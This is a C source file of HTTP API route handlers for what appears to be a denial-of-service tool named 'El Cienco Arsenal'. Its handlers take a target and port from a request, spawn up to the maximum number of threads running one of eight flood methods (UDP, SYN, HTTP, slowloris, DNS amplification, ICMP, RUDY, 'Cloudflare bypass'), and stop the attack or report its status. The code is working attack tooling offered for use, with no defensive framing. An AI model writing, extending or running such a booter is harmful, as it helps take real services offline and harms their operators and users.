#include "../include/elcienco.h"
#include "../include/api.h"
#include "routes.h"

// External attack state
extern volatile int attack_running;
extern pthread_t attack_threads[MAX_THREADS];
extern AttackConfig current_attack;
extern time_t attack_start_time;

void handle_attack(ApiRequest *req, ApiResponse *res) {
    AttackConfig config;
    
    if (!json_parse_attack_config(req->body, &config)) {
        res->status_code = HTTP_BAD_REQUEST;
        snprintf(res->body, API_BUFFER_SIZE,
            "{\"error\":\"INVALID_JSON\",\"message\":\"Malformed attack configuration\"}");
        return;
    }
    
    // Validate configuration
    if (strlen(config.target) == 0 || config.port == 0) {
        res->status_code = HTTP_BAD_REQUEST;
        snprintf(res->body, API_BUFFER_SIZE,
            "{\"error\":\"INVALID_CONFIG\",\"message\":\"Target and port required\"}");
        return;
    }
    
    if (config.threads > MAX_THREADS) {
        config.threads = MAX_THREADS;
    }
    
    if (config.duration > 3600) {
        config.duration = 3600; // Max 1 hour
    }
    
    // Store current attack config
    memcpy(&current_attack, &config, sizeof(AttackConfig));
    
    // Launch attack
    attack_running = 1;
    attack_start_time = time(NULL);
    
    for (int i = 0; i < config.threads; i++) {
        ThreadData *data = malloc(sizeof(ThreadData));
        data->config = config;
        data->thread_num = i;
        data->running = &attack_running;
        
        switch(config.method) {
            case 0: pthread_create(&attack_threads[i], NULL, udp_flood, data); break;
            case 1: pthread_create(&attack_threads[i], NULL, tcp_syn_flood, data); break;
            case 2: pthread_create(&attack_threads[i], NULL, http_flood, data); break;
            case 3: pthread_create(&attack_threads[i], NULL, slowloris_attack, data); break;
            case 4: pthread_create(&attack_threads[i], NULL, dns_amplification, data); break;
            case 5: pthread_create(&attack_threads[i], NULL, icmp_flood, data); break;
            case 6: pthread_create(&attack_threads[i], NULL, rudyloris_attack, data); break;
            case 7: pthread_create(&attack_threads[i], NULL, cloudflare_bypass, data); break;
        }
    }
    
    res->status_code = HTTP_OK;
    snprintf(res->body, API_BUFFER_SIZE,
        "{"
        "\"status\":\"ATTACK_INITIATED\","
        "\"target\":\"%s\","
        "\"port\":%d,"
        "\"threads\":%d,"
        "\"duration\":%d,"
        "\"method\":%d"
        "}",
        config.target, config.port, config.threads, 
        config.duration, config.method
    );
    
    printf("[API] Attack initiated: %s:%d (%d threads, method %d)\n",
           config.target, config.port, config.threads, config.method);
}

void handle_stop(ApiRequest *req, ApiResponse *res) {
    (void)req; // Unused
    
    attack_running = 0;
    
    // Wait for threads to finish
    for (int i = 0; i < current_attack.threads && i < MAX_THREADS; i++) {
        if (attack_threads[i]) {
            pthread_join(attack_threads[i], NULL);
            attack_threads[i] = 0;
        }
    }
    
    res->status_code = HTTP_OK;
    snprintf(res->body, API_BUFFER_SIZE,
        "{\"status\":\"ATTACK_STOPPED\",\"message\":\"All attack threads terminated\"}");
    
    printf("[API] Attack stopped\n");
}

void handle_status(ApiRequest *req, ApiResponse *res) {
    (void)req;
    
    int active = 0;
    for (int i = 0; i < MAX_THREADS; i++) {
        if (attack_threads[i]) active++;
    }
    
    time_t elapsed = attack_running ? (time(NULL) - attack_start_time) : 0;
    
    res->status_code = HTTP_OK;
    snprintf(res->body, API_BUFFER_SIZE,
        "{"
        "\"running\":%d,"
        "\"active_threads\":%d,"
        "\"target\":\"%s\","
        "\"port\":%d,"
        "\"method\":%d,"
        "\"elapsed\":%ld,"
        "\"duration\":%d"
        "}",
        attack_running, active,
        current_attack.target, current_attack.port,
        current_attack.method, elapsed, current_attack.duration
    );
}

void handle_methods(ApiRequest *req, ApiResponse *res) {
    (void)req;
    
    res->status_code = HTTP_OK;
    snprintf(res->body, API_BUFFER_SIZE,
        "{"
        "\"methods\":["
        "{\"id\":0,\"name\":\"UDP Flood\",\"layer\":\"L4\"},"
        "{\"id\":1,\"name\":\"TCP SYN Flood\",\"layer\":\"L4\"},"
        "{\"id\":2,\"name\":\"HTTP Flood\",\"layer\":\"L7\"},"
        "{\"id\":3,\"name\":\"Slowloris\",\"layer\":\"L7\"},"
        "{\"id\":4,\"name\":\"DNS Amplification\",\"layer\":\"L4\"},"
        "{\"id\":5,\"name\":\"ICMP Flood\",\"layer\":\"L3\"},"
        "{\"id\":6,\"name\":\"RudyLoris\",\"layer\":\"L7\"},"
        "{\"id\":7,\"name\":\"Cloudflare Bypass\",\"layer\":\"L7\"}"
        "],"
        "\"max_threads\":%d,"
        "\"max_duration\":3600"
        "}",
        MAX_THREADS
    );
}

void handle_config(ApiRequest *req, ApiResponse *res) {
    if (req->method == HTTP_METHOD_GET) {
        res->status_code = HTTP_OK;
        snprintf(res->body, API_BUFFER_SIZE,
            "{"
            "\"api_version\":\"%s\","
            "\"max_threads\":%d,"
            "\"max_packet_size\":%d,"
            "\"system\":\"El Cienco Arsenal\","
            "\"year\":2310"
            "}",
            API_VERSION, MAX_THREADS, MAX_PACKET_SIZE
        );
    } else if (req->method == HTTP_METHOD_POST) {
        // Update configuration (not implemented in this version)
        res->status_code = HTTP_OK;
        snprintf(res->body, API_BUFFER_SIZE,
            "{\"status\":\"OK\",\"message\":\"Config updated\"}");
    }
}

void handle_not_found(ApiRequest *req, ApiResponse *res) {
    (void)req;
    
    res->status_code = HTTP_NOT_FOUND;
    snprintf(res->body, API_BUFFER_SIZE,
        "{\"error\":\"ENDPOINT_NOT_FOUND\",\"message\":\"The requested endpoint does not exist\"}");
}
